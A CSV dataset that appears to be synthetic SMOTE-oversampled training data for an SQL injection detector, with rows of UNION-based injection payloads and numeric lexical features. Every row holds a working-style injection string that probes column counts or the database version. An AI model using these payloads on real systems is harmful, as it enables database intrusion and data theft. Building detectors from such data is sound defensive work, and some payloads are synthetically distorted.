id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000124,0.9327165688358645,80.3711529426466,21.32576941147068,3.3764616928067865,14.0,37.39384470823457,15.303077645882716,13.674230588529321,0.17434334159058407,0.4642776604956241,0.19126642790074916,0.17011257001304275,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.325769411470679,1.0,0.0,7.348461177058642,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000301,0.0919722315523312,80.8803963887763,22.0,3.6573374549300506,50.92026425918421,9.0,10.0,10.960132129592102,0.6295705661179143,0.11128830164625732,0.12365366849584147,0.13548746373998696,0.0,1.0,1.9601321295921021,0.0,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,6.980066064796051,2.9601321295921026,0.0,1.0,0.9800660647960511,0.01993393520394876,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000100,2.879970377661848,77.33818431775873,27.16909215887937,3.9391848128000446,40.0,2.0,23.415453920560317,11.922730397198421,0.5175481227493081,0.025877406137465392,0.30312955618832305,0.15344491492490347,1.7536382383190534,1.1690921588793688,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,4.0,0.5845460794396843,0.5845460794396844,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000035,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000054,0.16669723469427225,82.69525891424097,27.152370542879517,3.919093066862974,40.0,4.0,25.69525891424097,13.0,0.48374083644658056,0.04837408364465809,0.3106693080636227,0.15721577184513869,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.152370542879515,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000036,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000078,0.026332902571789565,76.0,25.091285297871817,3.8055963037430276,40.09128529787182,3.908714702128181,24.0,8.0,0.5275169118141029,0.051430456606949754,0.3157894736842105,0.10526315789473684,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000037,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.0,80.0,22.0,3.7750444615256264,14.0,44.0,8.0,14.0,0.175,0.55,0.1,0.175,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,union,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",nearest_attack_euclidean,R000291,0.353067858254112,79.33254528278832,21.332545282788317,3.718425808023563,14.0,43.334909434423366,8.997635848364952,13.0,0.17648763338661722,0.546464424578334,0.11316656817604699,0.1638813738590017,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1662726413941586,-1.3877787807814457e-17,0.0,8.833727358605842,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000297,0.80251083812507,75.76070208049049,20.760702080490493,3.5488374930865394,14.0,44.0,4.0,13.760702080490493,0.18479827559177775,0.5807945804313015,0.05279950731193647,0.1816076366649843,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.760702080490492,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000207,0.6279113603282395,78.3973782201184,17.0,3.1641779946984694,51.205243559763204,1.0,12.192134660355197,14.0,0.6535172333084618,0.012757294390906088,0.15512335082794723,0.17860212147268492,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.6986891100591996,1.0,0.0,8.301310889940801,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000213,1.4505643526134364,77.95327830265909,28.218688678936363,4.222195089778446,42.56262264212727,9.0,16.218688678936363,10.171966981595455,0.5457561582834064,0.1155653825984516,0.2086443483518452,0.13003411076629673,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.171966981595455,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,0.6093443394681816,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.609344339468182
SMOTE_000042,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000155,0.4135014365181315,82.41238573809703,25.853096434524257,4.0093892963499105,48.41238573809703,9.0,15.146903565475743,9.853096434524257,0.5873144906352447,0.10924028189067055,0.1839266752879413,0.11951855218614352,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.0,3.853096434524258,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.853096434524258,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.853096434524258
SMOTE_000043,attack,union," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000087,0.2794460141138022,79.43522314223459,28.0,3.9394516453550072,40.0,3.0,24.7176115711173,11.717611571117297,0.5036203644728552,0.037771527335464156,0.3111423633226793,0.14746574486900138,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000044,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000113,0.4612395533916106,76.12594978049009,26.0,4.2176229959519995,27.0,28.900759824392072,11.0,9.225189956098017,0.3549332259877946,0.3793383988292805,0.14460242540243484,0.12112594978049009,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.225189956098018,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000126,1.5409460346499608,76.0,19.797550335648808,3.4169878359681043,14.0,44.0,4.0,14.0,0.18421052631578946,0.5789473684210527,0.05263157894736842,0.18421052631578946,0.39877516782440475,0.6012248321755953,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,9.0,3.0,0.39877516782440475,0.6012248321755953,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,0.3980671409538086,78.44517749925924,22.222588749629622,3.7894518169211184,45.445177499259245,9.0,15.554822500740755,8.445177499259245,0.5792773810056979,0.11474253245299149,0.19842200562013318,0.10755808092117741,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.445177499259244,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,1.2392733040094683,77.79442089455443,22.55139477636139,3.722207799298718,44.79442089455443,9.0,14.0,10.0,0.5755289291974172,0.1157648374916135,0.18007863609806543,0.1286275972129039,0.5513947763613921,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.448605223638608,3.0,0.5513947763613921,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000023,0.5068083165290153,80.60259299328979,29.807778979869347,4.0839252851690055,40.0,3.0,23.602592993289782,14.0,0.49632565247994037,0.03722442393599554,0.292735945216085,0.1737139783679791,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000049,attack,union,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",nearest_attack_euclidean,R000277,0.6688546065274822,78.36911517204436,25.326176965591127,4.091837592611013,43.69529213763549,9.0,15.0,10.673823034408873,0.5573355313781405,0.11494632724193346,0.1915772120698891,0.136140929310037,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.673823034408873,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,2.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000035,0.29935271077070397,81.54725005050308,27.72637497474846,3.9643477911240677,40.0,4.0,24.547250050503077,13.0,0.49057117328274236,0.049057117328274225,0.3009360780720921,0.15943563131689126,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.726374974748461,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000052,0.07746929932024442,83.0,27.10771419168453,3.9264755333938846,42.0,3.8922858083154726,25.0,12.10771419168453,0.5060240963855421,0.04689500973874064,0.30120481927710846,0.14587607459860877,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000052,attack,union," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000061,0.7962107766478358,80.4599004312908,30.299502156454025,4.05485507969399,41.83960172516322,2.540099568709195,24.540099568709195,11.540099568709195,0.5198722408582447,0.03160930003130605,0.30504790967815826,0.14347054943229104,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.540099568709195,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,0.010104796158706826,77.02483521910519,16.0,3.087206141756951,50.019868175284145,1.0,14.0,12.004967043821038,0.6493962762973742,0.012983079629536709,0.181763114813514,0.15585752925957516,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,8.004967043821038,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000160,0.07431276654163294,77.0,17.0,3.128545659968197,54.0,1.0,8.0,14.0,0.7012987012987013,0.012987012987012991,0.1038961038961039,0.18181818181818182,0.019472904326598872,0.9805270956734012,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,2.0,0.019472904326598817,0.9805270956734012,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000247,0.12476903895024075,79.69649984044658,25.0,3.977404697328927,19.0,39.75719987235726,10.0,10.939299968089315,0.23846108383858583,0.49878599936178625,0.1255058335992557,0.13724708320037216,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,5.9392999680893155,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000297,0.7989815748228487,75.76175445925661,20.761754459256608,3.54863001720308,14.0,44.0,4.0,13.761754459256608,0.18479569080182587,0.5807864568057385,0.05279876880052167,0.18161908359191398,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.7617544592566083,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.2109659866130497,80.06596486013888,22.0,3.6553995092232805,51.0,9.0,10.0,10.065964860138882,0.6369808321192773,0.112408382138696,0.12489820237632888,0.1257125833656978,0.0,0.06596486013888128,2.0,0.0,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,7.0,3.0,0.0,0.06596486013888134,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,union," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,0.9817858900536381,78.0,26.449388686081136,3.8949523963411363,40.0,3.550611313918864,24.0,10.449388686081136,0.5128205128205128,0.04552065787075468,0.3076923076923077,0.1339665216164248,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.0,0.0,0.0,1.0,0.5506113139188642,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000059,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,1.2737471102020863,79.61859505453488,24.14421483639536,3.8192773681975045,46.23719010906976,9.0,14.38140494546512,10.0,0.5806805761332977,0.11304313995398516,0.18067279507495587,0.12560348883776126,1.7628098909302392,0.0,0.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.855785163604641,1.3814049454651196,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3814049454651196,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.38140494546512
SMOTE_000060,attack,union,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R000209,0.08235864727444894,76.0,22.0,3.6614021459005635,14.0,32.0,18.0,12.0,0.18421052631578946,0.42105263157894735,0.23684210526315788,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000108,0.24855852515162444,75.2959180745025,19.802721283665008,3.2489016941006357,14.0,36.78911486533997,13.408163850995024,11.098639358167496,0.18595848665931028,0.4882958229433175,0.17837084372334905,0.14737484667402306,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.901360641832504,-1.3877787807814457e-17,0.0,7.197278716334992,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.0,81.0,27.0,3.8852146856306904,42.0,4.0,25.0,10.0,0.5185185185185185,0.04938271604938271,0.30864197530864196,0.12345679012345678,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000063,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.0,81.0,29.0,4.025983607791268,40.0,3.0,24.0,14.0,0.49382716049382713,0.037037037037037035,0.2962962962962963,0.1728395061728395,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
